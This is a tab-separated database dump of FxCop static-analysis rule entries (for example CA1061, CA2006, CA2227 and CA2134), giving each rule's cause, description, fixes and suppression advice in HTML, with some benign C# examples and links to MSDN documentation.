329	CA1061: Do not hide base class methods	DoNotHideBaseClassMethods	CA1061	fxcop	<h2>Cause</h2>\n<p>\n            A derived type declares a method with the same name and with the same number of parameters as one of its base methods; one or more of the parameters is a base type of the corresponding parameter in the base method; and any remaining parameters have types that are identical to the corresponding parameters in the base method.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A method in a base type is hidden by an identically named method in a derived type when the parameter signature of the derived method differs only by types that are more weakly derived than the corresponding types in the parameter signature of the base method.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove or rename the method, or change the parameter signature so that the method does not hide the base method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182143.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182143.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806767	1511453806767	1
340	CA1018: Mark attributes with AttributeUsageAttribute	MarkAttributesWithAttributeUsage	CA1018	fxcop	<h2>Cause</h2>\n<p>\n            The <code>System.AttributeUsageAttribute</code> attribute is not present on the custom attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When you define a custom attribute, mark it by using <code>AttributeUsageAttribute</code> to indicate where in the source code the custom attribute can be applied. The meaning and intended usage of an attribute will determine its valid locations in code. For example, you might define an attribute that identifies the person who is responsible for maintaining and enhancing each type in a library, and that responsibility is always assigned at the type level. In this case, compilers should enable the attribute on classes, enumerations, and interfaces, but should not enable it on methods, events, or properties. Organizational policies and procedures would dictate whether the attribute should be enabled on assemblies.\n            The <code>System.AttributeTargets</code> enumeration defines the targets that you can specify for a custom attribute. If you omit <code>AttributeUsageAttribute</code>, your custom attribute will be valid for all targets, as defined by the <code>All</code> value of <code>AttributeTargets</code> enumeration.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, specify targets for the attribute by using <code>AttributeUsageAttribute</code>. See the following example.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You should fix a violation of this rule instead of excluding the message. Even if the attribute inherits <code>AttributeUsageAttribute</code>, the attribute should be present to simplify code maintenance.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:DefineAccessorsForAttributeArguments}<br/>\n\n\n\n\n                {rule:fxcop:AvoidUnsealedAttributes}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182158.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182158.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806781	1511453806781	1
330	CA2006: Use SafeHandle to encapsulate native resources	UseSafeHandleToEncapsulateNativeResources	CA2006	fxcop	<h2>Cause</h2>\n<p>\n            Managed code uses <code>IntPtr</code> to access native resources.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Use of <code>IntPtr</code> in managed code might indicate a potential security and reliability problem. All uses of <code>IntPtr</code> must be reviewed to determine whether the use of a <code>SafeHandle</code> , or a similar technology, is required in its place. Problems will occur if the <code>IntPtr</code> represents some native resource, such as memory, a file handle, or a socket, that the managed code is considered to own. If the managed code owns the resource, it must also release the native resources associated with it, because a failure to do so would cause resource leakage.\n            In such scenarios, security or reliability problems will also exist if multithreaded access is allowed to the <code>IntPtr</code> and a way of releasing the resource that is represented by the <code>IntPtr</code> is provided. These problems involve recycling of the <code>IntPtr</code> value on resource release while simultaneous use of the resource is being made on another thread. This can cause race conditions where one thread can read or write data that is associated with the wrong resource. For example, if your type stores an OS handle as an <code>IntPtr</code> and allows users to call both Close and any other method that uses that handle simultaneously and without some kind of synchronization, your code has a handle recycling problem.\n            This handle recycling problem can cause data corruption and, frequently, a security vulnerability. <code>SafeHandle</code> and its sibling class <code>CriticalHandle</code> provide a mechanism to encapsulate a native handle to a resource so that such threading problems can be avoided. Additionally, you can use <code>SafeHandle</code> and its sibling class <code>CriticalHandle</code> for other threading issues, for example, to carefully control the lifetime of managed objects that contain a copy of the native handle over calls to native methods. In this situation, you can often remove calls to <code>GC.KeepAlive</code>. The performance overhead thay you incur when you use <code>SafeHandle</code> and, to a lesser degree, <code>CriticalHandle</code>, can frequently be reduced through careful design.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Convert <code>IntPtr</code> usage to <code>SafeHandle</code> to safely manage access to native resources. See the <code>SafeHandle</code> reference topic for examples.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            You should not suppress this warning.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182294.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182294.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	15min	\N	\N	\N	\N	\N	f	HTML	1511453806768	1511453806769	1
331	CA2138: Transparent methods must not call methods with the SuppressUnmanagedCodeSecurity attribute	TransparentMethodsMustNotCallSuppressUnmanagedCodeSecurityMethods	CA2138	fxcop	<h2>Cause</h2>\n<p>\n            A security transparent method calls a method that is marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on any transparent method that calls directly into native code, for example, by using a via a P/Invoke (platform invoke) call. P/Invoke and COM interop methods that are marked with the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute result in a LinkDemand being done against the calling method. Because security transparent code cannot satisfy LinkDemands, the code also cannot call methods that are marked with the SuppressUnmanagedCodeSecurity attribute, or methods of class that is marked with SuppressUnmanagedCodeSecurity attribute. The method will fail, or the demand will be converted to a full demand.\n            Violations of this rule lead to a <code>MethodAccessException</code> in the Level 2 security transparency model, and a full demand for <code>UnmanagedCode</code> in the Level 1 transparency model.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, remove the <code>SuppressUnmanagedCodeSecurityAttribute</code> attribute and mark the method with the <code>SecurityCriticalAttribute</code> or the <code>SecuritySafeCriticalAttribute</code> attribute.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997711.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997711.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806770	1511453806770	1
332	CA1049: Types that own native resources should be disposable	TypesThatOwnNativeResourcesShouldBeDisposable	CA1049	fxcop	<h2>Cause</h2>\n<p>\n            A type references a <code>System.IntPtr</code> field, a <code>System.UIntPtr</code> field, or a <code>System.Runtime.InteropServices.HandleRef</code> field, but does not implement <code>System.IDisposable</code>.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule assumes that <code>IntPtr</code>, <code>UIntPtr</code>, and <code>HandleRef</code> fields store pointers to unmanaged resources. Types that allocate unmanaged resources should implement <code>IDisposable</code> to let callers to release those resources on demand and shorten the lifetimes of the objects that hold the resources.\n            The recommended design pattern to clean up unmanaged resources is to provide both an implicit and an explicit means to free those resources by using the <code>Object.Finalize</code> method and the <code>IDisposable.Dispose</code> method, respectively. The garbage collector calls the <code>Finalize</code> method of an object at some indeterminate time after the object is determined to be no longer reachable. After <code>Finalize</code> is called, an additional garbage collection is required to free the object. The <code>Dispose</code> method allows the caller to explicitly release resources on demand, earlier than the resources would be released if left to the garbage collector. After it cleans up the unmanaged resources, <code>Dispose</code> should call the <code>GC.SuppressFinalize</code> method to let the garbage collector know that <code>Finalize</code> no longer has to be called; this eliminates the need for the additional garbage collection and shortens the lifetime of the object.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, implement <code>IDisposable</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the type does not reference an unmanaged resource. Otherwise, do not suppress a warning from this rule because failure to implement <code>IDisposable</code> can cause unmanaged resources to become unavailable or underused.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:CallGCKeepAliveWhenUsingNativeResources}<br/>\n\n\n\n\n                {rule:fxcop:CallGCSuppressFinalizeCorrectly}<br/>\n\n\n\n\n                {rule:fxcop:DisposableTypesShouldDeclareFinalizer}<br/>\n\n\n\n\n                {rule:fxcop:TypesThatOwnDisposableFieldsShouldBeDisposable}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182173.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182173.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806771	1511453806772	1
333	CA1013: Overload operator equals on overloading add and subtract	OverloadOperatorEqualsOnOverloadingAddAndSubtract	CA1013	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected type implements the addition or subtraction operators without implementing the equality operator.\n</p>\n<h2>Rule Description</h2>\n<p>\n            When instances of a type can be combined by using operations such as addition and subtraction, you should almost always define equality to return <code>true</code> for any two instances that have the same constituent values.\n            You cannot use the default equality operator in an overloaded implementation of the equality operator. Doing so will cause a stack overflow. To implement the equality operator, use the Object.Equals method in your implementation. See the following example.\n\n\n\n\n\n\n\n\n\n            <pre>\nif (Object.ReferenceEquals(left, null))\n    return Object.ReferenceEquals(right, null);\nreturn left.Equals(right);\n</pre>\n\n\n\n\n\n\n\n\n\n\n\n                How to Fix Violations\n\n\n\n\n\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the default implementation of the equality operator provides the correct behavior for the type.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182164.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182164.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806773	1511453806773	1
334	CA1721: Property names should not match get methods	PropertyNamesShouldNotMatchGetMethods	CA1721	fxcop	<h2>Cause</h2>\n<p>\n            The name of a public or protected member starts with 'Get' and otherwise matches the name of a public or protected property. For example, a type that contains a method that is named 'GetColor' and a property that is named 'Color' violates this rule.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Get methods and properties should have names that clearly distinguish their function.\n            Naming conventions provide a common look for libraries that target the common language runtime. This reduces the time that is required to learn a new software library, and increases customer confidence that the library was developed by someone who has expertise in developing managed code.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Change the name so that it does not match the name of a method that is prefixed with 'Get'.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n\n\n\n\n\n                    Note\n\n\n\n\n                    This warning may be excluded if the Get method is caused by implementing IExtenderProvider interface.\n\n\n\n\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:UsePropertiesWhereAppropriate}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182253.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182253.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806774	1511453806774	1
335	CA1048: Do not declare virtual members in sealed types	DoNotDeclareVirtualMembersInSealedTypes	CA1048	fxcop	<h2>Cause</h2>\n<p>\n            A public type is sealed and declares a method that is both <code>virtual</code> (<code>Overridable</code> in Visual Basic) and not final. This rule does not report violations for delegate types, which must follow this pattern.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Types declare methods as virtual so that inheriting types can override the implementation of the virtual method. By definition, you cannot inherit from a sealed type, making a virtual method on a sealed type meaningless.\n            The Visual Basic .NET and C# compilers do not allow types to violate this rule.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the method non-virtual or make the type inheritable.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule. Leaving the type in its current state can cause maintenance issues and does not provide any benefits.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182140.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182140.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806775	1511453806775	1
336	CA2227: Collection properties should be read only	CollectionPropertiesShouldBeReadOnly	CA2227	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible writable property is a type that implements <code>System.Collections.ICollection</code>. Arrays, indexers (properties with the name 'Item'), and permission sets are ignored by the rule.\n</p>\n<h2>Rule Description</h2>\n<p>\n            A writable collection property allows a user to replace the collection with a completely different collection. A read-only property stops the collection from being replaced but still allows the individual members to be set. If replacing the collection is a goal, the preferred design pattern is to include a method to remove all the elements from the collection and a method to re-populate the collection. See the <code>Clear</code> and <code>AddRange</code> methods of the <code>System.Collections.ArrayList</code> class for an example of this pattern.\n            Both binary and XML serialization support read-only properties that are collections. The <code>System.Xml.Serialization.XmlSerializer</code> class has specific requirements for types that implement <code>ICollection</code> and <code>System.Collections.IEnumerable</code> in order to be serializable.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, make the property read-only and, if the design requires it, add methods to clear and re-populate the collection.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                <code>CA1819: Properties should not return arrays</code>\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182327.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182327.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806776	1511453806776	1
337	CA2109: Review visible event handlers	ReviewVisibleEventHandlers	CA2109	fxcop	<h2>Cause</h2>\n<p>\n            A public or protected event-handling method was detected.\n</p>\n<h2>Rule Description</h2>\n<p>\n            An externally visible event-handling method presents a security issue that requires review.\n            Event-handling methods should not be exposed unless absolutely necessary. An event handler, a delegate type, that invokes the exposed method can be added to any event as long as the handler and event signatures match. Events can potentially be raised by any code, and are frequently raised by highly trusted system code in response to user actions such as clicking a button. Adding a security check to an event-handling method does not prevent code from registering an event handler that invokes the method.\n            A demand cannot reliably protect a method invoked by an event handler. Security demands help protect code from untrusted callers by examining the callers on the call stack. Code that adds an event handler to an event is not necessarily present on the call stack when the event handler's methods run. Therefore, the call stack might have only highly trusted callers when the event handler method is invoked. This causes demands made by the event handler method to succeed. Also, the demanded permission might be asserted when the method is invoked. For these reasons, the risk of not fixing a violation of this rule can only be assessed after reviewing the event-handling method. When you review your code, consider the following issues:\n            <ul>\n              <li>\n                Does your event handler perform any operations that are dangerous or exploitable, such as asserting permissions or suppressing unmanaged code permission?\n              </li>\n              <li>\n                What are the security threats to and from your code because it can run at any time with only highly trusted callers on the stack?\n              </li>\n            </ul>\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, review the method and evaluate the following:\n            <ul>\n              <li>\n                Can you make the event-handling method non-public?\n              </li>\n              <li>\n                Can you move all dangerous functionality out of the event handler?\n              </li>\n              <li>\n                If a security demand is imposed, can this be accomplished in some other manner?\n              </li>\n            </ul>\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Suppress a warning from this rule only after a careful security review to make sure that your code does not pose a security threat.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182312.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182312.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	1h	\N	\N	\N	\N	\N	f	HTML	1511453806777	1511453806778	1
338	CA2228: Do not ship unreleased resource formats	DoNotShipUnreleasedResourceFormats	CA2228	fxcop	<h2>Cause</h2>\n<p>\n            A resource file was built using a version of the .NET Framework that is not currently supported.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Resource files that were built by using pre-release versions of the .NET Framework might not be usable by supported versions of the .NET Framework.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, build the resource using a supported version of the .NET Frameworkk.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182339.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182339.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806779	1511453806779	1
339	CA1020: Avoid namespaces with few types	AvoidNamespacesWithFewTypes	CA1020	fxcop	<h2>Cause</h2>\n<p>\n            A namespace other than the global namespace contains fewer than five types.\n</p>\n<h2>Rule Description</h2>\n<p>\n            Make sure that each of your namespaces has a logical organization, and that a valid reason exists to put types in a sparsely populated namespace. Namespaces should contain types that are used together in most scenarios. When their applications are mutually exclusive, types should be located in separate namespaces. For example, the <code>System.Web.UI</code> namespace contains types that are used in Web applications, and the <code>System.Windows.Forms</code> namespace contains types that are used in Windows-based applications. Even though both namespaces have types that control aspects of the user interface, these types are not designed for use in the same application. Therefore, they are located in separate namespaces. Careful namespace organization can also be helpful because it increases the discoverability of a feature. By examining the namespace hierarchy, library consumers should be able to locate the types that implement a feature.\n\n\n\n\n\n                    Note\n\n\n\n\n                    Design-time types and permissions should not be merged into other namespaces to comply with this guideline. These types belong in their own namespaces below your main namespace, and the namespaces should end in <code>.Design</code> and <code>.Permissions</code>, respectively.\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, try to combine namespaces that contain just a few types into a single namespace.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule when the namespace does not contain types that are used with the types in your other namespaces.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182130.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182130.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806780	1511453806780	1
341	CA1059: Members should not expose certain concrete types	MembersShouldNotExposeCertainConcreteTypes	CA1059	fxcop	<h2>Cause</h2>\n<p>\n            An externally visible member is a certain concrete type or exposes certain concrete types through one of its parameters or return value. Currently, this rule reports exposure of the following concrete types:\n            <ul>\n              <li>\n                A type derived from <code>System.Xml.XmlNode</code>.\n              </li>\n            </ul>\n</p>\n<h2>Rule Description</h2>\n<p>\n            A concrete type is a type that has a complete implementation and therefore can be instantiated. To allow widespread use of the member, replace the concrete type with the suggested interface. This allows the member to accept any type that implements the interface or be used where a type that implements the interface is expected.\n            The following table lists the targeted concrete types and their suggested replacements.\n\n\n\n\n\n\n\n                    Concrete type\n\n\n                    Replacement\n\n\n\n\n\n\n                        <code>XPathDocument</code>\n\n\n\n\n\n\n                        <code>System.Xml.XPath.IXPathNavigable</code>\n                      .\n                    Using the interface decouples the member from a specific implementation of an XML data source.\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the concrete type to the suggested interface.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a message from this rule if the specific functionality provided by the concrete type is required.\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                <code>CA1011: Consider passing base types as parameters</code>\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182160.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182160.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806782	1511453806783	1
342	CA2134: Methods must keep consistent transparency when overriding base methods	MethodsMustOverrideWithConsistentTransparency	CA2134	fxcop	<h2>Cause</h2>\n<p>\n            This rule fires when a method marked with the <code>SecurityCriticalAttribute</code> overrides a method that is transparent or marked with the <code>SecuritySafeCriticalAttribute</code>. The rule also fires when a method that is transparent or marked with the <code>SecuritySafeCriticalAttribute</code> overrides a method that is marked with a <code>SecurityCriticalAttribute</code>.\n            The rule is applied when overriding a virtual method or implementing an interface.\n\n\n\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule fires on attempts to change the security accessibility of a method further up the inheritance chain. For example, if a virtual method in a base class is transparent or safe-critical, then the derived class must override it with a transparent or safe-critical method. Conversely, if the virtual is security critical, the derived class must override it with a security critical method. The same rule applies for implementing interface methods.\n            Transparency rules are enforced when the code is JIT compiled instead of at runtime, so that the transparency calculation does not have dynamic type information. Therefore, the result of the transparency calculation must be able to be determined solely from the static types being JIT-compiled, regardless of the dynamic type.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the transparency of the method that is overriding a virtual method or implementing an interface to match the transparency of the virtual or interface method.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress warnings from this rule. Violations of this rule will result in a runtime <code>TypeLoadException</code> for assemblies that use level 2 transparency.\n</p>\n<h2>Examples</h2>\n\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\nusing System.Security;\n\nnamespace TransparencyWarningsDemo\n{\n\n    public interface IInterface\n    {\n        void TransparentInterfaceMethod();\n\n        [SecurityCritical]\n        void CriticalInterfaceMethod();\n    }\n\n    public class Base\n    {\n        public virtual void TransparentVirtual() { }\n\n        [SecurityCritical]\n        public virtual void CriticalVirtual() { }\n    }\n\n    public class Derived : Base, IInterface\n    {\n        // CA2134 violation - implementing a transparent method with a critical one.  This can be fixed by any of: \n        //   1. Making IInterface.TransparentInterfaceMethod security critical \n        //   2. Making Derived.TransparentInterfaceMethod transparent \n        //   3. Making Derived.TransparentInterfaceMethod safe critical\n        [SecurityCritical]\n        public void TransparentInterfaceMethod() { }\n\n        // CA2134 violation - implementing a critical method with a transparent one.  This can be fixed by any of: \n        //   1. Making IInterface.CriticalInterfaceMethod transparent \n        //   2. Making IInterface.CriticalInterfaceMethod safe critical \n        //   3. Making Derived.TransparentInterfaceMethod critical \n        public void CriticalInterfaceMethod() { }\n\n        // CA2134 violation - overriding a transparent method with a critical one.  This can be fixed by any of: \n        //   1. Making Base.TrasnparentVirtual critical \n        //   2. Making Derived.TransparentVirtual transparent \n        //   3. Making Derived.TransparentVirtual safe critical\n        [SecurityCritical]\n        public override void TransparentVirtual() { }\n\n        // CA2134 violation - overriding a critical method with a transparent one.  This can be fixed by any of: \n        //   1. Making Base.CriticalVirtual transparent \n        //   2. Making Base.CriticalVirtual safe critical \n        //   3. Making Derived.CriticalVirtual critical \n        public override void CriticalVirtual() { }\n    }\n\n}\n</pre>\n\n\n\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/dd997447.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/dd997447.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806784	1511453806786	1
343	CA1055: URI return values should not be strings	UriReturnValuesShouldNotBeStrings	CA1055	fxcop	<h2>Cause</h2>\n<p>\n            The name of a method contains "uri", "Uri", "urn", "Urn", "url", or "Url", and the method returns a string.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule splits the method name into tokens based on the Pascal casing convention and checks whether each token equals "uri", "Uri", "urn", "Urn", "url", or "Url". If there is a match, the rule assumes that the method returns a uniform resource identifier (URI). A string representation of a URI is prone to parsing and encoding errors, and can lead to security vulnerabilities. The <code>System.Uri</code> class provides these services in a safe and secure manner.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, change the return type to a <code>Uri</code>.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if the return value does not represent a URI.\n</p>\n<h2>Example</h2>\n<p>\n\n\n                {rule:fxcop:UriPropertiesShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:UriParametersShouldNotBeStrings}<br/>\n\n\n\n\n                {rule:fxcop:PassSystemUriObjectsInsteadOfStrings}<br/>\n\n\n\n\n                {rule:fxcop:StringUriOverloadsCallSystemUriOverloads}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182176.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182176.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	10min	\N	\N	\N	\N	\N	f	HTML	1511453806788	1511453806789	1
344	CA1815: Override equals and operator equals on value types	OverrideEqualsAndOperatorEqualsOnValueTypes	CA1815	fxcop	<h2>Cause</h2>\n<p>\n            A public value type does not override <code>Object.Equals</code>, or does not implement the equality operator (==). This rule does not check enumerations.\n</p>\n<h2>Rule Description</h2>\n<p>\n            For value types, the inherited implementation of <code>Equals</code> uses the Reflection library, and compares the contents of all fields. Reflection is computationally expensive, and comparing every field for equality might be unnecessary. If you expect users to compare or sort instances, or use them as hash table keys, your value type should implement <code>Equals</code>. If your programming language supports operator overloading, you should also provide an implementation of the equality and inequality operators.\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            To fix a violation of this rule, provide an implementation of <code>Equals</code>. If you can, implement the equality operator.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            It is safe to suppress a warning from this rule if instances of the value type will not be compared to each other.\n</p>\n<h2>Example of a Violation</h2>\n\n<h3>Description</h3>\n<p>\n                The following example shows a structure (value type) that violates this rule.\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    // Violates this rule     \n    public struct Point\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Example of How to Fix</h2>\n\n<h3>Description</h3>\n<p>\n                The following example fixes the previous violation by overriding ValueType.Equals and implementing the equality operators (==, !=).\n</p>\n<h3>Code</h3>\n<p>\n\n\n\n\n\n\n\n\n\n\n            <pre>\nusing System;\n\nnamespace Samples\n{\n    public struct Point : IEquatable&lt;Point&gt;\n    {\n        private readonly int _X;\n        private readonly int _Y;\n\n        public Point(int x, int y)\n        {\n            _X = x;\n            _Y = y;\n        }\n\n        public int X\n        {\n            get { return _X; }\n        }\n\n        public int Y\n        {\n            get { return _Y; }\n        }\n\n        public override int GetHashCode()\n        {\n            return _X ^ _Y;\n        }\n\n        public override bool Equals(object obj)\n        {\n            if (!(obj is Point))\n                return false;\n\n            return Equals((Point)obj);\n        }\n\n        public bool Equals(Point other)\n        {\n            if (_X != other._X)\n                return false;\n\n            return _Y == other._Y;\n        }\n\n        public static bool operator ==(Point point1, Point point2)\n        {\n            return point1.Equals(point2);\n        }\n\n        public static bool operator !=(Point point1, Point point2)\n        {\n            return !point1.Equals(point2);\n        }\n    }\n}\n</pre>\n\n\n\n\n\n</p>\n<h2>Related Rules</h2>\n<p>\n\n\n                {rule:fxcop:OverrideEqualsOnOverloadingOperatorEquals}<br/>\n\n\n\n\n                {rule:fxcop:OverloadOperatorEqualsOnOverridingValueTypeEquals}<br/>\n\n\n\n\n                {rule:fxcop:OperatorsShouldHaveSymmetricalOverloads}\n\n\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182276.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182276.aspx</a></p>	2	\N	READY	cs	\N	\N	\N	\N	\N	LINEAR	\N	45min	\N	\N	\N	\N	\N	f	HTML	1511453806790	1511453806791	1
346	CA2124: Wrap vulnerable finally clauses in outer try	WrapVulnerableFinallyClausesInOuterTry	CA2124	fxcop	<h2>Cause</h2>\n<p>\n            In versions 1.0 and 1.1 of the .NET Framework, a public or protected method contains a <code>try</code>/<code>catch</code>/<code>finally</code> block. The <code>finally</code> block appears to reset security state and is not enclosed in a <code>finally</code> block.\n</p>\n<h2>Rule Description</h2>\n<p>\n            This rule locates <code>try</code>/<code>finally</code> blocks in code that targets versions 1.0 and 1.1 of the .NET Framework that might be vulnerable to malicious exception filters present in the call stack. If sensitive operations such as impersonation occur in the try block, and an exception is thrown, the filter can execute before the <code>finally</code> block. For the impersonation example, this means that the filter would execute as the impersonated user. Filters are currently implementable only in Visual Basic.\n\n\n\n\n\n                    Caution\n\n\n\n\n\n                      Note   In versions 2.0 and later of the .NET Framework, the runtime automatically protects a <code>try</code>/<code>catch</code>/ <code>finally</code> block from malicious exception filters, if the reset occurs directly within the method that contains the exception block.\n\n\n\n\n</p>\n<h2>How to Fix Violations</h2>\n<p>\n            Place the unwrapped <code>try</code>/<code>finally</code> in an outer try block. See the second example that follows. This forces the <code>finally</code> to execute before filter code.\n</p>\n<h2>When to Suppress Warnings</h2>\n<p>\n            Do not suppress a warning from this rule.\n</p>\n<h2>Pseudo-code Example</h2>\n\n<h3>Description</h3>\n<p>\n                The following pseudo-code illustrates the pattern detected by this rule.\n</p><h2>MSDN Documentation</h2>\n<p><a href="http://msdn.microsoft.com/en-us/library/ms182322.aspx" target="_blank">http://msdn.microsoft.com/en-us/library/ms182322.aspx</a></p>	2	\N	